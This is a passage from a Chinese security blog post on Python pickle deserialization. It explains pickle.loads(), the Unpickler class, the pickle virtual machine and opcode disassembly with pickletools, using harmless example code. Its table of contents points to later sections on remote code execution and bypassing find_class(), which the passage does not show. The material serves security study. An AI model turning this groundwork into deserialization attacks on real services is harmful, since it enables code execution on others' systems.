<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Python-Pickle反序列化安全问题 | F4de&#39;s blog</title>
    <meta name="generator" content="VuePress 1.5.2">
    <link rel="icon" href="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201002215345.jpg">
    <meta name="description" content="西郊有密林，助君出重围。">
    <meta name="keywords" content="Web安全 | CTF">
    <meta name="baidu-site-verification" content="7F55weZDDc">
    <meta name="theme-color" content="#11a8cd">
    <link rel="preload" href="/assets/css/0.styles.c3dab397.css" as="style"><link rel="preload" href="/assets/js/app.23243609.js" as="script"><link rel="preload" href="/assets/js/2.b6b5fde6.js" as="script"><link rel="preload" href="/assets/js/13.e7eb76d3.js" as="script"><link rel="prefetch" href="/assets/js/10.61fe8e74.js"><link rel="prefetch" href="/assets/js/11.aa0a0e27.js"><link rel="prefetch" href="/assets/js/12.f76d046e.js"><link rel="prefetch" href="/assets/js/14.6843e7d6.js"><link rel="prefetch" href="/assets/js/15.876aebbe.js"><link rel="prefetch" href="/assets/js/16.7bda9fb3.js"><link rel="prefetch" href="/assets/js/17.4d23d90c.js"><link rel="prefetch" href="/assets/js/18.8e3bf455.js"><link rel="prefetch" href="/assets/js/19.e2910e1f.js"><link rel="prefetch" href="/assets/js/20.d3ad9048.js"><link rel="prefetch" href="/assets/js/21.44a5eb88.js"><link rel="prefetch" href="/assets/js/22.9fdb32fe.js"><link rel="prefetch" href="/assets/js/23.a4171f9f.js"><link rel="prefetch" href="/assets/js/24.1dc52702.js"><link rel="prefetch" href="/assets/js/25.0d5d1524.js"><link rel="prefetch" href="/assets/js/26.acc4bd8a.js"><link rel="prefetch" href="/assets/js/27.70c3076c.js"><link rel="prefetch" href="/assets/js/28.a6cd030a.js"><link rel="prefetch" href="/assets/js/29.74b979df.js"><link rel="prefetch" href="/assets/js/3.b2dd61fd.js"><link rel="prefetch" href="/assets/js/30.48245f1e.js"><link rel="prefetch" href="/assets/js/31.100f6dc2.js"><link rel="prefetch" href="/assets/js/32.7fc433c9.js"><link rel="prefetch" href="/assets/js/33.29387a0a.js"><link rel="prefetch" href="/assets/js/34.9de6377e.js"><link rel="prefetch" href="/assets/js/35.8d8e3101.js"><link rel="prefetch" href="/assets/js/36.cffc3ac2.js"><link rel="prefetch" href="/assets/js/37.78556217.js"><link rel="prefetch" href="/assets/js/4.1d65e77b.js"><link rel="prefetch" href="/assets/js/5.477d6d12.js"><link rel="prefetch" href="/assets/js/6.9074f6ba.js"><link rel="prefetch" href="/assets/js/7.3da58132.js"><link rel="prefetch" href="/assets/js/8.10db4dab.js"><link rel="prefetch" href="/assets/js/9.e2574eb5.js">
    <link rel="stylesheet" href="/assets/css/0.styles.c3dab397.css">
  </head>
  <body class="theme-mode-light">
    <div id="app" data-server-rendered="true"><div class="theme-container sidebar-open have-rightmenu"><header class="navbar blur"><div title="目录" class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><img src="/img/EB-logo.png" alt="F4de's blog" class="logo"> <span class="site-name can-hide">F4de's blog</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/" class="nav-link">首页</a></div><div class="nav-item"><a href="/writeup/" class="nav-link">WP整理</a></div><div class="nav-item"><a href="/technology/" class="nav-link">技术文章</a></div><div class="nav-item"><a href="/study/" class="nav-link">学习笔记</a></div><div class="nav-item"><a href="/essay/" class="nav-link">其它随笔</a></div><div class="nav-item"><a href="/about/" class="nav-link">关于|友链</a></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar" style="display:none;"><div class="blogger"><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201002215345.jpg"> <div class="blogger-info"><h3>F4de</h3> <span>Syclover | Web</span></div></div> <nav class="nav-links"><div class="nav-item"><a href="/" class="nav-link">首页</a></div><div class="nav-item"><a href="/writeup/" class="nav-link">WP整理</a></div><div class="nav-item"><a href="/technology/" class="nav-link">技术文章</a></div><div class="nav-item"><a href="/study/" class="nav-link">学习笔记</a></div><div class="nav-item"><a href="/essay/" class="nav-link">其它随笔</a></div><div class="nav-item"><a href="/about/" class="nav-link">关于|友链</a></div> <!----></nav>  <ul class="sidebar-links"><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>php安全</span> <span class="arrow right"></span></p> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading open"><span>python安全</span> <span class="arrow down"></span></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/pages/20ac5e/" aria-current="page" class="active sidebar-link">Python-Pickle反序列化安全问题</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/20ac5e/#pickle：python的序列化库" class="sidebar-link">Pickle：python的序列化库</a></li><li class="sidebar-sub-header"><a href="/pages/20ac5e/#pickle-loads-：我是一个接口" class="sidebar-link">pickle.loads()：我是一个接口</a></li><li class="sidebar-sub-header"><a href="/pages/20ac5e/#unpickler类：更加底层的运作方式" class="sidebar-link">Unpickler类：更加底层的运作方式</a></li><li class="sidebar-sub-header"><a href="/pages/20ac5e/#pickletools：pickle调试器" class="sidebar-link">Pickletools：Pickle调试器</a></li><li class="sidebar-sub-header"><a href="/pages/20ac5e/#opcode：不同的操作码对应不同的动作" class="sidebar-link">opcode：不同的操作码对应不同的动作</a></li><li class="sidebar-sub-header"><a href="/pages/20ac5e/#opcode：我有不同的版本" class="sidebar-link">opcode：我有不同的版本</a></li><li class="sidebar-sub-header"><a href="/pages/20ac5e/#常用opcode含义表（0版本）" class="sidebar-link">常用opcode含义表（0版本）</a></li><li class="sidebar-sub-header"><a href="/pages/20ac5e/#r操作符：危险的信号" class="sidebar-link">R操作符：危险的信号</a></li><li class="sidebar-sub-header"><a href="/pages/20ac5e/#c操作符：可以进行变量覆盖" class="sidebar-link">c操作符：可以进行变量覆盖</a></li><li class="sidebar-sub-header"><a href="/pages/20ac5e/#rce：只有r操作符可以做到吗？" class="sidebar-link">RCE：只有R操作符可以做到吗？</a></li><li class="sidebar-sub-header"><a href="/pages/20ac5e/#重写find-class-：不一定绝对安全" class="sidebar-link">重写find_class()：不一定绝对安全</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/20ac5e/#rce" class="sidebar-link">RCE</a></li><li class="sidebar-sub-header"><a href="/pages/20ac5e/#变量覆盖" class="sidebar-link">变量覆盖</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/20ac5e/#结语" class="sidebar-link">结语</a></li><li class="sidebar-sub-header"><a href="/pages/20ac5e/#参考文章" class="sidebar-link">参考文章</a></li></ul></li></ul></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>Java安全</span> <span class="arrow right"></span></p> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>其他</span> <span class="arrow right"></span></p> <!----></section></li></ul> </aside> <div><main class="page"> <div class="theme-vdoing-wrapper bg-style-6"><div class="articleInfo-wrap" data-v-f945b7fe><div class="articleInfo" data-v-f945b7fe><ul class="breadcrumbs" data-v-f945b7fe><li data-v-f945b7fe><a href="/" title="首页" class="iconfont icon-home router-link-active" data-v-f945b7fe></a></li> <li data-v-f945b7fe><span data-v-f945b7fe>技术文章</span></li> <li data-v-f945b7fe><span data-v-f945b7fe>python安全</span></li></ul> <div class="info" data-v-f945b7fe><div title="作者" class="author iconfont icon-touxiang" data-v-f945b7fe><a href="javascript:;" data-v-f945b7fe>F4de</a></div> <div title="创建时间" class="date iconfont icon-riqi" data-v-f945b7fe><a href="javascript:;" data-v-f945b7fe>2020-11-15</a></div> <!----></div></div></div> <!----> <div class="content-wrapper"><div class="right-menu-wrapper"><div class="right-menu-margin"><div class="right-menu-content"></div></div></div> <h1><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAeCAYAAAA7MK6iAAAAAXNSR0IArs4c6QAABGpJREFUSA3tVVtoXFUU3fvOI53UlmCaKIFmwEhsE7QK0ipFEdHEKpXaZGrp15SINsXUWvBDpBgQRKi0+KKoFeJHfZA+ED9KKoIU2gYD9UejTW4rVIzm0VSTziPzuNu1z507dibTTjL4U/DAzLn3nL3X2o91ziX6f9wMFdh6Jvbm9nNSV0msViVO6tN1Rm7NMu2OpeJ9lWBUTDxrJbYTS0hInuwciu9eLHlFxCLCZEk3MegsJmZ5K/JD6t7FkFdEvGUo1g7qJoG3MHImqRIn8/nzY1K9UPKKiJmtnUqHVE3Gbuay6vJE/N2FEmuxFjW2nUuE0yQXRRxLiTUAzs36zhZvOXJPdX850EVnnLZkB8prodQoM5JGj7Xk2mvC7JB8tG04Ef5PiXtG0UtxupRQSfTnBoCy554x18yJHI6I+G5Eru4LHmPJZEQsrvPUbMiA8G/WgMK7w7I+ez7++o2ANfbrjvaOl1tFMs+htG3IrZH9/hDX1Pr8Tc0UvH8tcX29KzAgIGcEkINyW5BF9x891hw6VYqgJHEk0huccS7vh3C6gTiODL+26huuBtbct8eZnqLML8PkxGYpuPZBqtqwkSjgc4mB5gbgig5i+y0UDK35LMxXisn9xQtK+nd26gTIHsHe/oblK/b29fUmN/8Y+9jAQrnBp56m1LcDlDp9irKTExSKduXJVWSqdBMA08pEJnEIOB3FPPMybu/oeV8zFeYN3xx576Q6RH+VmplE4ncQV5v+5rzSoyOU7PuEAg8g803PwBJ0CExno/jcMbN8tONYeOmHiuUNryvm3fRUy4tMPVLdAGkUhNWuggGrJcXPv+ouCjz0MKUHz1J2/E8IC9nqTabcxgaBYM0hPhD5Y65FsbxRQKxCQrDjDctW7PUM3HuZunFyifSAqEfuzCp48Il24luWUWZoyJCaPR82jE0+kFA643wRFVni4RYSq3ohJO2pZ7B5dO4xkDWbEpossJPLSrPjYID8rS2UHTlvyNxqIGsg674XJJ7vnh5L7PNwC4hh2sjCI96mzszOTpxLF0T7l88Yz7lAuK6OnL8gXLOnTvpzSb22YG8W7us3jSebFHeeqnXRG1vt+MoUM84LQIBmMsCTAcOauTh0T0l0neQK7m2bLMt2mGxU3HYssS0J2cdv5wljlPsrIuZLAG/2DOZIXgCYT8uMGZN+e2kSirfxZOPCsC0f24nTZzspnVn9VePS1Z5vubmAGGXG8ZFno9Hel0yfA5ZPhF7Dh972BQJ2qCpgH67lmWtBYbvk6sz02wjky2vXyz0XErP/kFB619js1BtwfOV4OPRqOQBjy3Qbk18vigUPPSD5ceHnwck7W9bhAqZdd7SuG7w4/P2F/GaJh8c7e9qgow+Q7cGBo+98WsLkuktFqiZabtXuQTu/Y5ETbR0v7tNSFnvrmu6pjdoan2KjMu8q/Hmj1EfCO2ZGfEIbIXKUlw8qaX9/b2oeSJmFksSeT/Fn0V3nSypChh4Gjh74ybO9aeZ/AN2dwciu2/MhAAAAAElFTkSuQmCC">
          Python-Pickle反序列化安全问题
        </h1> <div class="theme-vdoing-content content__default"><blockquote><p>在python中，相比于存储一个数字或者字符串，如果我们想要存储一个字典、列表或者对象，似乎并没有那么容易。但python和PHP等其他语言一样，也提供了一种序列化和反序列化的方法用来解决这个问题：我们可以把他们“序列化”成一种符合特殊规范的字符串，然后将其存储到一个文件当中。当我们想要获取该元素的时候，可以从文件中读取对应的字符串来进行“反序列化”，再经过某种特定的规范进行某种操作来获取到对应的元素。简单来说，把一个“对象”(或者其他)变成“字符串”的过程，就叫做序列化；把“字符串”翻译成“对象”的过程，叫做反序列化。<strong>但是不正确的反序列化会引发一些安全问题。</strong></p></blockquote> <h2 id="pickle：python的序列化库"><a href="#pickle：python的序列化库" class="header-anchor">#</a> Pickle：python的序列化库</h2> <p>现来看一段简单的代码：</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> pickle

<span class="token keyword">class</span> <span class="token class-name">pickle_test</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>date <span class="token operator">=</span> <span class="token number">20200911</span>
        self<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">&quot;F4de&quot;</span>

a <span class="token operator">=</span> pickle_test<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># 序列化对象</span>
s <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>a<span class="token punctuation">,</span> protocol<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>
<span class="token comment"># 执行反序列化操作</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><p>我们把一个简单的类进行实例化操作并将其序列化，然后对得到的序列化字符串进行一次反序列化的操作，程序的运行结果如下：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200911202437.png" alt="image-20200911202430271"></p> <p>我们序列化操作完成的时候得到了一串晦涩难懂的字符串（<strong>现在我们不需要知道它具体的含义，之后会进行讲解</strong>）；然后反序列化的时候获得了<code>pickle_test</code>类的实例化对象（__main__是python顶层代码执行的作用域的名称）。<strong>OK，至此我们就完成了一次简单的序列化与反序列化的操作。</strong></p> <blockquote><p><strong>摘自python官方文档</strong></p> <p>下列类型可以被打包：</p> <ul><li><code>None</code>、<code>True</code> 和 <code>False</code></li> <li>整数、浮点数、复数</li> <li>str、byte、bytearray</li> <li>只包含可打包对象的集合，包括 tuple、list、set 和 dict</li> <li>定义在模块顶层的函数（使用 <a href="https://docs.python.org/zh-cn/3.7/reference/compound_stmts.html#def" target="_blank" rel="noopener noreferrer"><code>def</code><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a> 定义，<a href="https://docs.python.org/zh-cn/3.7/reference/expressions.html#lambda" target="_blank" rel="noopener noreferrer"><code>lambda</code><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a> 函数则不可以）</li> <li>定义在模块顶层的内置函数</li> <li>定义在模块顶层的类</li> <li>某些类实例，这些类的 <a href="https://docs.python.org/zh-cn/3.7/library/stdtypes.html#object.__dict__" target="_blank" rel="noopener noreferrer"><code>__dict__</code><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a> 属性值或 <a href="https://docs.python.org/zh-cn/3.7/library/pickle.html#object.__getstate__" target="_blank" rel="noopener noreferrer"><code>__getstate__()</code><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a> 函数的返回值可以被打包</li></ul></blockquote> <p><strong>存储一个字符串和存储一个对象，前者显然是更加容易的。</strong></p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200911203620.png" alt="image-20200911203418851"></p> <h2 id="pickle-loads-：我是一个接口"><a href="#pickle-loads-：我是一个接口" class="header-anchor">#</a> pickle.loads()：我是一个接口</h2> <p>根据上面的学习可以知道，python是通过pickle.loads()方法将那一串字符串“翻译”成一个对象的。其实<code>loads()</code>方法是实现于<code>Unpickler</code>类的，下面是<code>loads()</code>方法的底层代码：</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">def</span> <span class="token function">_loads</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">,</span> fix_imports<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">&quot;ASCII&quot;</span><span class="token punctuation">,</span> errors<span class="token operator">=</span><span class="token string">&quot;strict&quot;</span><span class="token punctuation">,</span>
           buffers<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">raise</span> TypeError<span class="token punctuation">(</span><span class="token string">&quot;Can't load pickle from unicode string&quot;</span><span class="token punctuation">)</span>
    <span class="token builtin">file</span> <span class="token operator">=</span> io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
    <span class="token keyword">return</span> _Unpickler<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span> fix_imports<span class="token operator">=</span>fix_imports<span class="token punctuation">,</span> buffers<span class="token operator">=</span>buffers<span class="token punctuation">,</span>
                      encoding<span class="token operator">=</span>encoding<span class="token punctuation">,</span> errors<span class="token operator">=</span>errors<span class="token punctuation">)</span><span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>通过阅读源码我们可以得到如下的信息：<code>loads()</code>方法把得到的东西作为流传给<code>Unpickler</code>类，并调用该类的<code>load()</code>方法。</p> <h2 id="unpickler类：更加底层的运作方式"><a href="#unpickler类：更加底层的运作方式" class="header-anchor">#</a> Unpickler类：更加底层的运作方式</h2> <p>下面我们来看<code>Unpickler</code>类都做了一些什么事情</p> <blockquote><p><strong>摘自python官方文档：</strong></p> <p><em>class</em> pickle.Unpickler(<em>file</em>, ***, <em>fix_imports=True</em>, <em>encoding=&quot;ASCII&quot;</em>, <em>errors=&quot;strict&quot;</em>)</p> <p>它接受一个二进制文件用于读取 pickle 数据流。</p> <p>Pickle 协议版本是自动检测出来的，所以不需要参数来指定协议。</p> <p>参数 <em>file</em> 必须有两个方法，其中 <code>read()</code> 方法接受一个整数参数，而 <code>readline()</code> 方法不需要参数。 两个方法都应返回字节串。 因此 <em>file</em> 可以是一个打开用于二进制读取的磁盘文件对象、一个 <a href="https://docs.python.org/zh-cn/3.7/library/io.html#io.BytesIO" target="_blank" rel="noopener noreferrer"><code>io.BytesIO</code><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a> 对象，或者任何满足此接口要求的其他自定义对象。</p> <p>可选的关键字参数有 <em>fix_imports</em>, <em>encoding</em> 和 <em>errors</em>，它们用于控制由 Python 2 所生成 pickle 流的兼容性支持。 如果 <em>fix_imports</em> 为真值，则 pickle 将尝试把旧的 Python 2 名称映射到 Python 3 所使用的新名称。 <em>encoding</em> 和 <em>errors</em> 将告知 pickle 如何解码由 Python 2 所封存的 8 位字符串实例；这两个参数的默认值分别为 'ASCII' 和 'strict'。 <em>encoding</em> 可设为 'bytes' 以将这些 8 位字符串实例作为字节对象来读取。</p> <ul><li><p><code>load</code>()</p> <p>从构造函数中指定的文件对象里读取打包好的对象，重建其中特定对象的层次结构并返回。打包对象以外的其他字节将被忽略。</p></li></ul></blockquote> <p><code>Unpickler.load()</code>解析那个晦涩难懂的字符串的时候，依赖于<code>Pickle Virtual Machine(PVM)</code>进行，而PVM涉及到以下的几个概念：</p> <ul><li>栈：用来临时存储数据、参数和对象。</li> <li>解析引擎：从二进制流中读取opcode和参数，并对其进行解释处理，直至遇到<code>.</code>号为止，最终停留在栈顶的值将被作为反序列化的值返回。</li> <li>内存：为PVM的生命周期提供存储。</li></ul> <p>也就是说，<code>Unpickler.load()</code>方法依赖于PVM，在底层对序列化字符串进行着某种操作，从而最后得到了我们看到的反序列化出来的结果。</p> <p><strong>那么有没有一种方法，可以让我们直观的看到这种运作方式呢？</strong></p> <h2 id="pickletools：pickle调试器"><a href="#pickletools：pickle调试器" class="header-anchor">#</a> Pickletools：Pickle调试器</h2> <p><code>Pickletools</code>是python自带的一个库，其主要功能如下：</p> <ul><li>反汇编一个已经序列化字符串。</li> <li>对一个序列化字符串进行优化（去除一些不必要的指令）。</li></ul> <p>对一个序列化字符串进行反汇编，获得其汇编指令（依然采用文章开始的例子）：</p> <blockquote><p><strong>使用pickletools的dis方法对一个已经打包好的字符串进行反汇编。</strong></p></blockquote> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> pickle
<span class="token keyword">import</span> pickletools

<span class="token keyword">class</span> <span class="token class-name">pickle_test</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>date <span class="token operator">=</span> <span class="token number">20200911</span>
        self<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">&quot;F4de&quot;</span>

a <span class="token operator">=</span> pickle_test<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># 序列化对象</span>
s <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>a<span class="token punctuation">,</span> protocol<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;序列化完成·······&quot;</span><span class="token punctuation">)</span>

<span class="token comment"># 进行反汇编</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'------------------'</span><span class="token punctuation">)</span>
pickletools<span class="token punctuation">.</span>dis<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br></div></div><p>运行结果如下：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200912120056.png" alt="image-20200911213033875"></p> <p>我们还可以对其进行优化，使打包好的字符串和反汇编指令更加简洁：</p> <blockquote><p><strong>使用pickletools库中的optimize方法对打包的字符串和反汇编指令进行优化。</strong></p></blockquote> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> pickle
<span class="token keyword">import</span> pickletools

<span class="token keyword">class</span> <span class="token class-name">pickle_test</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>date <span class="token operator">=</span> <span class="token number">20200911</span>
        self<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">&quot;F4de&quot;</span>

a <span class="token operator">=</span> pickle_test<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># 序列化对象</span>
s <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>a<span class="token punctuation">,</span> protocol<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>
<span class="token comment"># 进行优化</span>
s <span class="token operator">=</span> pickletools<span class="token punctuation">.</span>optimize<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;序列化完成·······&quot;</span><span class="token punctuation">)</span>


<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'------------------'</span><span class="token punctuation">)</span>
pickletools<span class="token punctuation">.</span>dis<span class="token punctuation">(</span>s<span class="token punctuation">)</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200911213355.png" alt="image-20200911213355786"></p> <p>横向对比优化前和优化后指令，发现少了一些非必要的<code>BINPUT</code>指令，该指令的作用是<em>push item from memo on stack; index is 1-byte arg</em>，简单来说就是把当前栈的栈顶复制一份，放进储存区。<strong>总之，利用pickletools，我们可以以一种更加清晰的方式看到PVM在底层运作序列化字符串的方式。</strong></p> <p>在上文中，我们了解了<code>Unpickler</code>是利用PVM来运作opcode的，<strong>接下来开始介绍PVM是如何识别那个晦涩难懂的字符串并转化成一个个的指令在栈和内存中执行的。</strong></p> <h2 id="opcode：不同的操作码对应不同的动作"><a href="#opcode：不同的操作码对应不同的动作" class="header-anchor">#</a> opcode：不同的操作码对应不同的动作</h2> <p>**上面对于opcode的介绍算是一个小插曲，接下来开始学习PVM是如何运作opcode的。**我们再次回到那个晦涩难懂的字符串：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200911220452.png" alt="image-20200911213355786"></p> <p>我们需要知道的是：<strong>PVM引擎会识别opcode中不同的指令码，从而进行相应的操作。</strong></p> <p>字符串的第一个字符是<code>\x80</code>，PVM引擎识别到这个字符，就会进行如下的操作：<strong>再向下读取一个字节。</strong></p> <p>那么接下来，它会读取到<code>\x02</code>，PVM读到这个字符会识别出序列化协议的版本是2。继续往后走，它会读取到<code>c</code>操作符，PVM会做下面这么一件事情：<strong>连续往后读取两个字符串（每个字符串以\n结尾），第一个字符串记为moudle，第二个字符串记为name，并把moudle.name压进当前栈中</strong>；对应上面的例子，moudle就是<code>__main__</code>，name就是<code>pickle_test</code>，PVM会把<code>__main__.pickle_test</code>压进当前栈中。<strong>所以到目前为止，栈中的元素只有一个<code>__main__.pickle_test</code>。</strong></p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200912114103.png" alt="image-20200912114056837"></p> <p>再往下读取到<code>）</code>，PVM会进行的操作是：<strong>把一个空的元组压入当前栈。</strong></p> <p><img 